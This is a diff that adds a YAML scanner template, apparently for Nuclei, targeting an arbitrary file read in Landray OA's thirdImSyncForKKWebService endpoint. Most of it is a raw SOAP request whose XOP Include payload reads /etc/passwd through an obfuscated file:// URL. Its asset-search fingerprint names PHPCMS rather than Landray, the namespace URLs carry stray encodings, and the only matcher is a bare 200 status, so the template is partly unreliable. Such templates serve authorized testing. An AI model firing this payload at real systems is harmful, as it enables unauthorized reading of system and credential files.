@@ -1,0 +1,41 @@
+id: poc-xs93v9cap4ftrdp1
+info:
+  name: 蓝凌OA thirdimsyncforkkwebservice 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xs93v9cap4ftrdp1'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xs93v9cap4ftrdp1
+    fofa: app="PC-PHPCMS"||app="PHPCMS演示站"
+http:
+- raw:
+  - 'POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+
+    Connection: close
+
+    Content-Length: 633
+
+    Content-Type: multipart/related; boundary=aic4ddii0acc4ogaqgha
+
+    Accept-Encoding: gzip, deflate, br
+
+    --aic4ddii0acc4ogaqgha
+
+    Content-Disposition: form-data; name="message"
+
+    Content-Type: text/plain; charset=ISO-8859-1 Content-Transfer-Encoding: 8bit
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/%22 xmlns:web="http://webservice.kk.im.third.kmss.landray.com/%22> <soapenv:Header/> <soapenv:Body> <web:getTodo> <arg0> <otherCond>1</otherCond> <pageNo>1</pageNo> <rowSize>1</rowSize> <targets>1</targets> <type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include%22 href="file:///e%74c%2fpa%73%73wd"/></type> </arg0> </web:getTodo> </soapenv:Body> </soapenv:Envelope>
+
+    --aic4ddii0acc4ogaqgha--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
